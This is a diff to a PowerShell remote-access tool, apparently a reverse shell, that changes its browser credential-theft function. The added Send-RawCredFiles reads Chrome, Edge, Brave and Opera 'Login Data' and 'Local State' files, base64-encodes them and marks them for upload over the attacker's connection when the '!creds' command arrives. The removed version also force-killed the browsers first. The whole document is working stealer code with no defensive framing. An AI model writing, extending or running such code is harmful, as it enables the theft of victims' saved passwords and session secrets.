@@ -391,49 +391,36 @@ function PortSuggest {
 
     
 
-    function Steal-ChromeCredsFiles {
-    # Сначала убиваем все браузеры
-    $browsersToKill = @("chrome", "msedge", "brave", "opera")
-
-    foreach ($proc in $browsersToKill) {
-        try {
-            Stop-Process -Name $proc -Force -ErrorAction SilentlyContinue
-        } catch {}
-    }
-
-    Start-Sleep -Seconds 2  # даём системе отпустить файлы
-
+    function Send-RawCredFiles {
     $browsers = @{
-        "Chrome" = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default"
-        "Edge"   = "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default"
-        "Brave"  = "$env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data\\Default"
-        "Opera"  = "$env:APPDATA\\Opera Software\\Opera Stable"
+        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
+        "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
+        "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
+        "Opera"  = "$env:APPDATA\Opera Software\Opera Stable"
     }
 
     $result = ""
 
     foreach ($name in $browsers.Keys) {
         $base = $browsers[$name]
-        $loginData = Join-Path $base "Login Data"
-        $localState = Join-Path (Split-Path $base -Parent) "Local State"
+        $login = Join-Path $base "Login Data"
+        $state = Join-Path (Split-Path $base -Parent) "Local State"
 
-        if ((Test-Path $loginData) -and (Test-Path $localState)) {
+        if ((Test-Path $login) -and (Test-Path $state)) {
             try {
-                $loginB64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($loginData))
-                $stateB64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($localState))
-                $result += "`n[$name]::LoginData::$loginB64::LocalState::$stateB64::END"
+                $login_b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($login))
+                $state_b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($state))
+                $result += "[UPLOAD]::${name}_LoginData::${login_b64}::END`n"
+                $result += "[UPLOAD]::${name}_LocalState::${state_b64}::END`n"
             } catch {
-                $result += "`n[ERROR] Failed to steal from ${name}: $($_.Exception.Message)"
+                $result += "[ERROR] Failed to read files for $name: $($_.Exception.Message)`n"
             }
         }
     }
 
-    if ($result) {
-        return $result
-    } else {
-        return "[ERROR] No browser credential files found"
-    }
+    return $result
 }
+
 
 function Send-DecryptedBrowserCreds {
     try {
@@ -736,7 +723,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            AAAA                                                                                                                                                                   
+                                            F                                                                                                                                                                  
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
@@ -795,8 +782,8 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         $response = Tree-List
                     }
                     elseif ($cmd -eq "!creds") {
-                            $response = Send-DecryptedBrowserCreds
-                        }
+                        $response = Send-RawCredFiles
+                    }
                     elseif ($cmd -eq "scanHosts") {
                         Get-AliveHosts -stream $stream
                         $response = ""
